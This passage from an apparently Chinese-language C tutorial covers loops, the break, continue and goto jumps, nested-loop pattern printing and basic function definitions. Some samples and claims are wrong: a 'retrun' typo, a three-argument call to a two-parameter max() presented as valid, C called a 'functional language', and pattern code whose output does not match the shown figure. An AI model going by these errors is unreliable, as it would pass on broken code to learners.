    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)  <span class="hljs-comment">// 死循环</span>
         <span class="hljs-type">int</span> num = <span class="hljs-number">10</span>; <span class="hljs-comment">// 报错</span>
         <span class="hljs-comment">// 没有能够让循环结束的语句</span>
&#125;
</code></pre>
<ul>
<li>C语言中分号(;)也是一条语句, 称之为空语句</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (count &lt; <span class="hljs-number">3</span>);&#123; <span class="hljs-comment">// 死循环</span>
       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); 
       count++; 
    &#125;
&#125;
</code></pre>
<ul>
<li>最简单的死循环</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 死循环一般在操作系统级别的应用程序会比较多, 日常开发中很少用</span>
<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);
</code></pre>
<ul>
<li>while练习
<ul>
<li>计算1 + 2 + 3 + …n的和</li>
<li>获取1～100之间 7的倍数的个数</li>
</ul>
</li>
</ul>
<h2 id="循环结构do-while">循环结构do while</h2>
<ul>
<li>格式:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;
    循环体中的语句;
    能够让循环结束的语句;
    ....
&#125; <span class="hljs-keyword">while</span> (循环控制条件 );
</code></pre>
<ul>
<li>示例</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">do</span> &#123;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);
   count++;
&#125;<span class="hljs-keyword">while</span>(count &lt; <span class="hljs-number">10</span>);
</code></pre>
<ul>
<li>do-while循环执行流程
<ul>
<li>首先不管while中的条件是否成立, 都会执行一次&quot;循环体&quot;</li>
<li>执行完一次循环体,接着再次判断while中的条件是否为真, 为真继续执行循环体,为假跳出循环</li>
<li>重复以上操作, 直到&quot;循环控制条件&quot;为假为止</li>
</ul>
</li>
<li>应用场景
<ul>
<li>口令校验</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-type">int</span> num = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">do</span>&#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入密码,验证您的身份\n&quot;</span>);
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);
    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">123456</span> != num);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;主人,您终于回来了\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>while和dowhile应用场景
<ul>
<li>绝大多数情况下while和dowhile可以互换, 所以能用while就用while</li>
<li>无论如何都需要先执行一次循环体的情况, 才使用dowhile</li>
<li>do while 曾一度提议废除，但是他在输入性检查方面还是有点用的</li>
</ul>
</li>
</ul>
<h2 id="循环结构for">循环结构for</h2>
<ul>
<li>格式:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">for</span>(初始化表达式；循环条件表达式；循环后的操作表达式) &#123;
    循环体中的语句;
&#125;
</code></pre>
<ul>
<li>
<p>示例</p>
<pre><code class="hljs plaintext">for(int i = 0; i &lt; 10; i++)&#123;
    printf(&quot;发射子弹~哔哔哔哔\n&quot;);
&#125;
</code></pre>
<ul>
<li>for循环执行流程
<ul>
<li>首先执行&quot;初始化表达式&quot;，而且在整个循环过程中,<em><strong>只会执行一次</strong></em>初始化表达式</li>
<li>接着判断&quot;循环条件表达式&quot;是否为真，为真执行循环体中的语句</li>
<li>循环体执行完毕后，接下来会执行&quot;循环后的操作表达式&quot;，然后再次判断条件是否为真,为真继续执行循环体,为假跳出循环</li>
<li>重复上述过程，直到条件不成立就结束for循环</li>
</ul>
</li>
<li>for循环注意点:
<ul>
<li>和while一模一样</li>
<li>最简单的死循环<code>for(;;);</code></li>
</ul>
</li>
<li>for和while应用场景
<ul>
<li>while能做的for都能做, 所以企业开发中能用for就用for, 因为for更为灵活</li>
<li>而且对比while来说for更节约内存空间</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始化表达式</span>
<span class="hljs-keyword">while</span> (count &lt; <span class="hljs-number">10</span>) &#123; <span class="hljs-comment">// 条件表达式</span>
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔 %i\n&quot;</span>, count);
      count++; <span class="hljs-comment">// 循环后增量表达式</span>
&#125;
<span class="hljs-comment">// 如果初始化表达式的值, 需要在循环之后使用, 那么就用while</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;count = %i\n&quot;</span>, count);
</code></pre>
<pre><code class="hljs c"><span class="hljs-comment">// 注意: 在for循环初始化表达式中定义的变量, 只能在for循环后面的&#123;&#125;中访问</span>
<span class="hljs-comment">// 所以: 如果初始化表达式的值, 不需要在循环之后使用, 那么就用for</span>
<span class="hljs-comment">// 因为如果初始化表达式的值, 在循环之后就不需要使用了 , 那么用while会导致性能问题</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; count &lt; <span class="hljs-number">10</span>; count++) &#123;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔 %i\n&quot;</span>, count);
&#125;
<span class="hljs-comment">//     printf(&quot;count = %i\n&quot;, count);</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-comment">// 如果需要使用初始化表达式的值, 也可以将初始化表达式写到外面</span>
<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (; count &lt; <span class="hljs-number">10</span>; count++) &#123;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>, count);
&#125;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;count = %i\n&quot;</span>, count);
</code></pre>
<h2 id="四大跳转">四大跳转</h2>
<ul>
<li>C语言中提供了四大跳转语句, 分别是return、break、continue、goto</li>
<li>break:
<ul>
<li>立即跳出switch语句或循环</li>
</ul>
</li>
<li>应用场景:
<ul>
<li>switch</li>
<li>循环结构<br>
<img src="https://img-blog.csdnimg.cn/img_convert/0e25085138af3b717421a0efa1ca15ea.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/b33f91151bb51ee305c5c57d6fb8bc3e.png" alt="img"></li>
</ul>
</li>
<li>break注意点:
<ul>
<li>break离开应用范围，存在是没有意义的</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>) &#123;
  <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 会报错</span>
&#125;
</code></pre>
<ul>
<li>在多层循环中,一个break语句只向外跳一层</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;
  <span class="hljs-keyword">while</span>(<span class="hljs-number">2</span>) &#123;
    <span class="hljs-keyword">break</span>;<span class="hljs-comment">// 只对while2有效, 不会影响while1</span>
  &#125;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;while1循环体\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>break下面不可以有语句，因为执行不到</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">2</span>)&#123;
  <span class="hljs-keyword">break</span>;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打我啊!&quot;</span>);<span class="hljs-comment">// 执行不到</span>
&#125;
</code></pre>
<ul>
<li>continue
<ul>
<li>结束<em><strong>本轮</strong></em>循环，进入<em><strong>下一轮</strong></em>循环</li>
</ul>
</li>
<li>应用场景:
<ul>
<li>循环结构<br>
<img src="https://img-blog.csdnimg.cn/img_convert/583422ddce6be561ca9c76019f629c19.png" alt="img"></li>
</ul>
</li>
<li>continue注意点:
<ul>
<li>continue离开应用范围，存在是没有意义的</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>) &#123;
  <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 会报错</span>
&#125;
</code></pre>
<p>goto</p>
<ul>
<li>这是一个不太值得探讨的话题，goto 会破坏结构化程序设计流程，它将使程序层次不清，且不易读，所以慎用</li>
<li>goto 语句，仅能在本函数内实现跳转，不能实现跨函数跳转(短跳转)。但是他在跳出多重循环的时候效率还是蛮高的<br>
<img src="https://img-blog.csdnimg.cn/img_convert/5610c5561d5bc2e8471818965057f247.png" alt="img"></li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;
<span class="hljs-comment">// loop:是定义的标记</span>
loop:<span class="hljs-keyword">if</span>(num &lt; <span class="hljs-number">10</span>)&#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %d\n&quot;</span>, num);
        num++;
        <span class="hljs-comment">// goto loop代表跳转到标记的位置</span>
        <span class="hljs-keyword">goto</span> loop;
    &#125;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
        <span class="hljs-keyword">while</span>(<span class="hljs-number">2</span>)&#123;
            <span class="hljs-keyword">goto</span> lnj;
        &#125;
    &#125;
    lnj:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;跳过了所有循环&quot;</span>);
&#125;
</code></pre>
<ul>
<li>return
<ul>
<li>结束当前函数，将结果返回给调用者</li>
<li>不着急, 放一放,学到函数我们再回头来看它</li>
</ul>
</li>
</ul>
<hr>
<h2 id="循环的嵌套">循环的嵌套</h2>
<ul>
<li>循环结构的循环体中存在其他的循环结构，我们称之为循环嵌套
<ul>
<li>注意: 一般循环嵌套不超过三层</li>
<li>外循环执行的次数 * 内循环执行的次数就是内循环总共执行的次数</li>
</ul>
</li>
<li>格式:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">while</span>(条件表达式) &#123;
    <span class="hljs-keyword">while</span>循环结构 or dowhile循环结构 or <span class="hljs-keyword">for</span>循环结构
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span>(初始化表达式；循环条件表达式；循环后的操作表达式) &#123;
    <span class="hljs-keyword">while</span>循环结构 or dowhile循环结构 or <span class="hljs-keyword">for</span>循环结构
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;
     <span class="hljs-keyword">while</span>循环结构 or dowhile循环结构 or <span class="hljs-keyword">for</span>循环结构
&#125; <span class="hljs-keyword">while</span> (循环控制条件 );
</code></pre>
<ul>
<li>循环优化
<ul>
<li>在多重循环中，如果有可能，应当将最长的循环放在最内层，最短的循环放在最外层，以减少 CPU 跨切循环层的次数</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row&lt;<span class="hljs-number">100</span>; row++) &#123;
  <span class="hljs-comment">// 低效率：长循环在最外层</span>
  <span class="hljs-keyword">for</span> ( col=<span class="hljs-number">0</span>; col&lt;<span class="hljs-number">5</span>; col++ ) &#123;
    sum = sum + a[row][col];
  &#125;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col&lt;<span class="hljs-number">5</span>; col++ ) &#123;
  <span class="hljs-comment">// 高效率：长循环在最内层</span>
  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row&lt;<span class="hljs-number">100</span>; row++) &#123;
    sum = sum + a[row][col];
  &#125;
&#125;
</code></pre>
<ul>
<li>练习
<ul>
<li>打印好友列表</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">好友列表<span class="hljs-number">1</span>
    好友<span class="hljs-number">1</span>
    好友<span class="hljs-number">2</span>
好友列表<span class="hljs-number">2</span>
    好友<span class="hljs-number">1</span>
    好友<span class="hljs-number">2</span>
好友列表<span class="hljs-number">3</span>
    好友<span class="hljs-number">1</span>
    好友<span class="hljs-number">2</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;好友列表%d\n&quot;</span>, i+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    角色%d\n&quot;</span>, j);
    &#125;
&#125;
</code></pre>
<h2 id="图形打印">图形打印</h2>
<ul>
<li>一重循环解决线性的问题，而二重循环和三重循环就可以解决平面和立体的问题了</li>
<li>打印矩形</li>
</ul>
<pre><code class="hljs c">****
****
****
</code></pre>
<pre><code class="hljs c"><span class="hljs-comment">// 3行4列</span>
<span class="hljs-comment">//  外循环控制行数</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;
<span class="hljs-comment">//        内循环控制列数</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>打印三角形
<ul>
<li>尖尖朝上，改变内循环的条件表达式，让内循环的条件表达式随着外循环的i值变化</li>
<li>尖尖朝下，改变内循环的初始化表达式，让内循环的初始化表达式随着外循环的i值变化</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">*
**
***
****
*****
</code></pre>
<pre><code class="hljs c"><span class="hljs-comment">/*</span>
<span class="hljs-comment">最多打印5行</span>
<span class="hljs-comment">最多打印5列</span>
<span class="hljs-comment">每一行和每一列关系是什么? 列数&lt;=行数</span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++) &#123;
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= i; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<pre><code class="hljs c">*****
****
***
**
*
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++) &#123;
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i; j &lt; <span class="hljs-number">5</span>; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>练习
<ul>
<li>打印特殊三角形</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">1</span>
<span class="hljs-number">12</span>
<span class="hljs-number">123</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= i; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, j+<span class="hljs-number">1</span>);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>打印特殊三角形</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">1</span>
<span class="hljs-number">22</span>
<span class="hljs-number">333</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span>; i++) &#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, i);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>打印特殊三角形</li>
</ul>
<pre><code class="hljs c">--*
-***
*****
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">5</span>; i++) &#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span> - i; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-&quot;</span>);
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>; m++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>打印99乘法表</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">1</span> * <span class="hljs-number">1</span> = <span class="hljs-number">1</span>
<span class="hljs-number">1</span> * <span class="hljs-number">2</span> = <span class="hljs-number">2</span>     <span class="hljs-number">2</span> * <span class="hljs-number">2</span> = <span class="hljs-number">4</span>
<span class="hljs-number">1</span> * <span class="hljs-number">3</span> = <span class="hljs-number">3</span>     <span class="hljs-number">2</span> * <span class="hljs-number">3</span> = <span class="hljs-number">6</span>     <span class="hljs-number">3</span> * <span class="hljs-number">3</span> = <span class="hljs-number">9</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d = %d \t&quot;</span>, j, i, (j * i));
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
</code></pre>
<h2 id="函数基本概念">函数基本概念</h2>
<ul>
<li>C源程序是由函数组成的
<ul>
<li>例如: 我们前面学习的课程当中,通过main函数+scanf函数+printf函数+逻辑代码就可以组成一个C语言程序</li>
</ul>
</li>
<li>C语言不仅提供了极为丰富的库函数, 还允许用户建立自己定义的函数。用户可把自己的算法编写成一个个相对独立的函数，然后再需要的时候调用它
<ul>
<li>例如:你用C语言编写了一个MP3播放器程序，那么它的程序结构如下图所示</li>
<li><img src="https://img-blog.csdnimg.cn/img_convert/999533b52cc1a0662418449a29f4e3b9.png" alt="img"></li>
</ul>
</li>
<li>可以说C程序的全部工作都是由各式各样的函数完成的,所以也把C语言称为函数式语言</li>
</ul>
<hr>
<h2 id="函数的分类">函数的分类</h2>
<ul>
<li>在C语言中可从不同的角度对函数分类</li>
<li>从函数定义的角度看,函数可分为库函数和用户定义函数两种
<ul>
<li><em><strong>库函数:</strong></em> 由C语言系统提供,用户无须定义,也不必在程序中作类型说明,只需在程序前包含有该函数原型的头文件即可在程序中直接调用。在前面各章的例题中反复用到printf、scanf、getchar、putchar等函数均属此类</li>
<li>***用户定义函数:***由用户按需编写的函数。对于用户自定义函数,不仅要在程序中定义函数本身,而且在主调函数模块中还必须对该被调函数进行类型说明,然后才能使用</li>
</ul>
</li>
<li>从函数执行结果的角度来看, 函数可分为有返回值函数和无返回值函数两种
<ul>
<li><em><strong>有返回值函数:</strong></em> 此类函数被调用执行完后将向调用者返回一个执行结果,称为函数返回值。(必须指定返回值类型和使用return关键字返回对应数据)</li>
<li><em><strong>无返回值函数:</strong></em> 此类函数用于完成某项特定的处理任务,执行完成后不向调用者返回函数值。(返回值类型为void, 不用使用return关键字返回对应数据)</li>
</ul>
</li>
<li>从主调函数和被调函数之间数据传送的角度看,又可分为无参函数和有参函数两种
<ul>
<li><em><strong>无参函数:</strong></em> 在函数定义及函数说明及函数调用中均不带参数。主调函数和被调函数之间不进行参数传送。</li>
<li><em><strong>有参函数:</strong></em> 在函数定义及函数说明时都有参数,称为形式参数(简称为形参)。在函数调用时也必须给出参数,称为实际参数(简称为实参)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="函数的定义">函数的定义</h2>
<ul>
<li>定义函数的目的
<ul>
<li>将一个常用的功能封装起来，方便以后调用</li>
</ul>
</li>
<li>自定义函数的书写格式</li>
</ul>
<pre><code class="hljs c">返回值类型 函数名(参数类型 形式参数<span class="hljs-number">1</span>，参数类型 形式参数<span class="hljs-number">2</span>，…) &#123;
    函数体;
    返回值;
&#125;
</code></pre>
<ul>
<li>示例</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);
    retrun <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>定义函数的步骤
<ul>
<li>函数名：函数叫什么名字</li>
<li>函数体：函数是干啥的，里面包含了什么代码</li>
<li>返回值类型: 函数执行完毕返回什么和调用者</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>无参无返回值函数定义
<ul>
<li>没有返回值时return可以省略</li>
<li>格式:</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> 函数名() &#123;
    函数体;
&#125;
</code></pre>
<ul>
<li>示例:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 1.没有返回值/没有形参</span>
<span class="hljs-comment">// 如果一个函数不需要返回任何数据给调用者, 那么返回值类型就是void</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">printRose</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &#123;@&#125;\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; \\|/\n&quot;</span>); <span class="hljs-comment">// 注意: \是一个特殊的符号(转意字符), 想输出\必须写两个斜线</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n&quot;</span>);
  <span class="hljs-comment">// 如果函数不需要返回数据给调用者, 那么函数中的return可以不写</span>
&#125;
</code></pre>
<p>无参有返回值函数定义</p>
<ul>
<li>
<p>格式:</p>
<pre><code class="hljs plaintext">返回值类型 函数名() &#123;
    函数体;
    return 值;
&#125;
</code></pre>
<ul>
<li>示例:</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入两个整数, 以逗号隔开, 以回车结束\n&quot;</span>);
    <span class="hljs-type">int</span> number1, number2;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%i,%i&quot;</span>, &amp;number1, &amp;number2);
    <span class="hljs-type">int</span> max = number1 &gt; number2 ? number1 : number2;
    <span class="hljs-keyword">return</span> max;
&#125;
</code></pre>
<p>有参无返回值函数定义</p>
<ul>
<li>形式参数表列表的格式: <code>类型 变量名,类型 变量2,......</code></li>
<li>格式:</li>
</ul>
<pre><code class="hljs plaintext">void 函数名(参数类型 形式参数1，参数类型 形式参数2，…) &#123;
    函数体;
&#125;
</code></pre>
<ul>
<li>示例:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">printMax</span><span class="hljs-params">(<span class="hljs-type">int</span> value1, <span class="hljs-type">int</span> value2)</span> &#123;
    <span class="hljs-type">int</span> max = value1 &gt; value2 ? value1 : value2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max);
&#125;
</code></pre>
<p>有参有返回值函数定义</p>
<ul>
<li>格式:</li>
</ul>
<pre><code class="hljs c">返回值类型 函数名(参数类型 形式参数<span class="hljs-number">1</span>，参数类型 形式参数<span class="hljs-number">2</span>，…) &#123;
    函数体;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>示例:</li>
</ul>
<pre><code class="hljs c"> <span class="hljs-type">int</span> <span class="hljs-title function_">printMax</span><span class="hljs-params">(<span class="hljs-type">int</span> value1, <span class="hljs-type">int</span> value2)</span> &#123;
    <span class="hljs-type">int</span> max = value1 &gt; value2 ? value1 : value2;
    <span class="hljs-keyword">return</span> max;
&#125;</code></pre>
<ul>
<li>
<p>函数定义注意</p>
</li>
<li>
<ul>
<li>函数名称不能相同</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;
&#125;
<span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">// 报错</span>
&#125;</code></pre>
</li>
</ul>
<h2 id="函数的参数和返回值">函数的参数和返回值</h2>
<ul>
<li>形式参数
<ul>
<li>在<em><strong>定义函数</strong></em>时，函数名后面小括号()中定义的变量称为形式参数，简称形参</li>
<li>形参变量只有在被调用时才分配内存单元,在调用结束时,即刻释放所分配的内存单元。</li>
<li>因此,形参只有在函数内部有效,函数调用结束返回主调函数后则不能再使用该形参变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> number1, <span class="hljs-type">int</span> number2)</span> <span class="hljs-comment">//  形式参数</span>
&#123;
    <span class="hljs-keyword">return</span> number1 &gt; number2 ? number1 : number2;
&#125;</code></pre>
<hr>
<ul>
<li>实际参数
<ul>
<li>在<em><strong>调用函数</strong></em>时, 传入的值称为实际参数，简称实参</li>
<li>实参可以是常量、变量、表达式、函数等,无论实参是何种类型的量,在进行函数调用时,它们都必须具有确定的值,以便把这些值传送给形参</li>
<li>因此应预先用赋值,输入等办法使实参获得确定值</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> num = <span class="hljs-number">99</span>;
    <span class="hljs-comment">// 88, num, 22+44均能得到一个确定的值, 所以都可以作为实参</span>
    max(<span class="hljs-number">88</span>, num, <span class="hljs-number">22</span>+<span class="hljs-number">44</span>); <span class="hljs-comment">// 实际参数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>形参、实参注意点</p>
<ul>
<li>调用函数时传递的实参个数必须和函数的形参个数必须保持一致</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> number1, <span class="hljs-type">int</span> number2)</span> &#123; <span class="hljs-comment">//  形式参数</span>
    <span class="hljs-keyword">return</span> number1 &gt; number2 ? number1 : number2;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">// 函数需要2个形参, 但是我们只传递了一个实参, 所以报错</span>
    max(<span class="hljs-number">88</span>); <span class="hljs-comment">// 实际参数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>形参实参类型不一致, 会自动转换为形参类型</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">double</span> number1, <span class="hljs-type">double</span> number2)</span> &#123;<span class="hljs-comment">//  形式参数</span>
   <span class="hljs-comment">// 输出结果: 10.000000, 20.000000</span>
   <span class="hljs-comment">// 自动将实参转换为double类型后保存</span>
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number1 = %f, number2 = %f&quot;</span>, number1, number2);
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    change(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);
